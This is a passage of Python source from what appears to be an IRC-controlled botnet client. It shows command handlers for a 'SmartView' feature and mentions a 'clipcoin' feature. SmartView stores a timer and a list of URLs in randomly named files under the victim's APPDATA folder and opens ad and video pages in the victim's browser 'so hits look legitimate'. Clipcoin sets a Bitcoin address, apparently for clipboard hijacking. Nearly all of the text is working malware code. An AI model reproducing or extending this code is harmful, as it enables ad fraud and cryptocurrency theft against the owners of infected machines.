                                sendmsg("Syntax: "+cmdprefix+"clipcoin.disable - "+cmdprefix+"clipcoin.setaddress BTC_ADDRESS - "+cmdprefix+"clipcoin.status",s,outputChannel)
                        elif cmdprefix+"smartview" in command.lower().split(" ")[3]:
                            if cmdprefix+"smartview.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"SmartView.Timer.Help - "+cmdprefix+"SmartView.SetWebsites.Help - !SmartView.Disable.Help - SmartView.Status.Help",s,outputChannel)
                            elif cmdprefix+"smartview.timer" in command.lower().split(" ")[3]:
                                if cmdprefix+"smartview.timer.help" in command.lower().split(" ")[3]:
                                    sendmsg("Syntax: "+cmdprefix+"SmartView.Timer 30.0 - Open specified web page/s every x seconds - can't be 0.",s,outputChannel)
                                else:
                                    errord=False
                                    timetimer=0.0
                                    try:
                                        timetimer=float(command.split(" ")[4])
                                    except Exception as ex:
                                        sendmsg("Error! Unable to set timer. Was the value not specified, or non-integer, or non-floating-point?",s,outputChannel)
                                        errord=True
                                        pass
                                    if timetimer > 1.0:
                                        enabled=False
                                        for theFile in listdir(getenv("APPDATA")+installDir):
                                            if theFile.endswith(".xml"):
                                                with open(getenv("APPDATA")+installDir+"\\"+theFile, "w") as fileWrite:
                                                    fileWrite.write(str(timetimer))
                                                    enabled=True
                                        if enabled == False:
                                            fileName=""
                                            for x in range(randrange(1,4), randrange(7,10)):
                                                fileName = fileName + choice(letters+digits)
                                            with open(getenv("APPDATA")+installDir+"\\"+fileName+".xml", "w") as fileWrite:
                                                fileWrite.write(str(timetimer))
                                                enabled=True
                                        if enabled == True and talk == True:
                                            sendmsg("Timer set.",s,outputChannel)
                                    elif errord == False:
                                        sendmsg("Timer value too low.",s,outputChanne)
                            elif cmdprefix+"smartview.setwebsites" in command.lower().split(" ")[3]:
                                if cmdprefix+"smartview.setwebsites.help" in command.lower().split(" ")[3]:
                                    sendmsg("Syntax: "+cmdprefix+"SmartView.SetWebsites - http://coinurl.com/ad.php|http://google.ru/adsense|http://youtube.com/watch?v=views - shorten URLs for hit tracking + a referer. Auto enables Smart View if timer > 1.0 seconds, set the timer before/after setwebsites - it'll function normally. Opens URL/s as popup from the browser in use. If no browser is in use it'll open in a random installed browser so hits look legitimate. Pages get saved for next reboot.",s,outputChannel)
                                else:
                                    websites = ""
                                    try:
                                        websites = command.split(" ")[4]
                                    except:
                                        sendmsg("Error! You must specify the websites you'd like to visit with Smart View.",s,outputChannel)
                                        pass
                                    if not websites == "" and not websites.replace("|","") == "":
                                        enabled=False
                                        for theFile in listdir(getenv("APPDATA")+installDir):
                                            if theFile.endswith(".dat"):
                                                with open(getenv("APPDATA")+installDir+"\\"+theFile, "w") as fileWrite:
                                                    fileWrite.write(websites)
                                                    enabled=True
                                        if enabled == False:
                                            fileName = ""
                                            for x in range(randrange(1,4), randrange(7,10)):
                                                fileName = fileName + choice(letters+digits)
                                            with open(getenv("APPDATA")+installDir+"\\"+fileName+".dat", "w") as fileWrite:
                                                fileWrite.write(websites)
                                        if talk == True:
                                            sendmsg("Websites set. Make sure timer is above 0 to enable Smart View.",s,outputChannel)
                            elif cmdprefix+"smartview.disable" in command.lower().split(" ")[3] or cmdprefix+"smartview.status" in command.lower().split(" ")[3]:
                                if cmdprefix+"smartview.disable.help" in command.lower().split(" ")[3]:
                                    sendmsg("Syntax: "+cmdprefix+"SmartView.Disable - Disables Smart View.",s,outputChannel)
                                elif cmdprefix+"smartview.status.help" in command.lower().split(" ")[3]:
                                    sendmsg("Syntax: "+cmdprefix+"SmartView.Status - Tells you weather or not Smart View is running.",s,outputChannel)
                                else:
                                    denabled=False
                                    timerTEXT=""
                                    for theFile in listdir(getenv("APPDATA")+installDir):
                                        if theFile.endswith(".xml"):
                                            with open(getenv("APPDATA")+installDir+"\\"+theFile, "r") as fileContents:
                                                text = fileContents.read()
                                                try:
                                                    if float(text) > 1.0:
                                                        denabled=True
                                                        timerTEXT=str(text)
                                                except:
                                                    pass
                                    killmsg=False
                                    if denabled == True:
                                        enabled = False
                                        for theFile in listdir(getenv("APPDATA")+installDir):
                                            if theFile.endswith(".dat"):
                                                with open(getenv("APPDATA")+installDir+"\\"+theFile, "r") as fileContents:
                                                    websitesA = fileContents.read()
                                                    if not websitesA == "":
                                                        enabled = True
                                                        if cmdprefix+"smartview.status" in command.split(" ")[3]:
                                                            sendmsg("SmartView running. Page/s: "+websitesA.replace("|", ", ")+" Timer: "+timerTEXT,s,outputChannel)
                                                if enabled == True and cmdprefix+"smartview.disable" in command.split(" ")[3]:
                                                    with open(getenv("APPDATA")+installDir+"\\"+theFile, "w") as fileWrite:
                                                        fileWrite.write("")
                                                    if talk == True and killmsg == False:
                                                        sendmsg("SmartView disabled.",s,outputChannel)
                                                        killmsg = True
                                        if enabled == False and talk == True:
                                            sendmsg("SmartView not running. Page/s not set.",s,outputChannel)
                                    elif talk == True:
                                        sendmsg("SmartView not running: Timer not specified, or value is too low.",s,outputChannel)
                        command = ""
                    except Exception as e:
                        if doDie == True:
                            raise SystemExit
                        if not "#" in outputChannel:
                            outputChannel=ircServer.split(":")[2]
                        sendmsg("Error: "+str(e), s, outputChannel)
                        pass
    except Exception as e:
        if doDie == True:
            raise SystemExit
        print e
        pass
